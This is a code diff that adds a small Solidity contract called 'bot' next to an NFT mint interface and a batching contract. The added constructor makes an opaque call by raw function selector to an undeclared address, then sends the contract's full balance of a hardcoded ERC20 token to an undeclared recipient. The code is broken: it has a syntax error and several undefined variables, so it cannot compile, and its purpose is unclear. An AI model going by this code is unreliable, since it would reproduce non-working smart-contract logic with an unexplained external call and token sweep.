@@ -7,6 +7,23 @@ interface INFT {
     function mint(address to) external;
 }
 
+contract bot {
+    constructor(
+        uint256 id,
+    ) payable {
+        bytes32[] memory params;
+        bool Success;
+        contractAddress = payable(contractAddress);
+        token = ERC20(address(0x030B8487c5f5b77193b53e56F951865B79358e30));
+        (bool success, ) = contractAddress.call{value: 0}(
+            abi.encodeWithSelector(0xd7aada81, bind_address, params)
+        );
+        require(success, "f");
+        Success = token.transfer(to, token.balanceOf(address(this)));
+    }
+}
+
+
 contract Batcher {
     address owner;
 
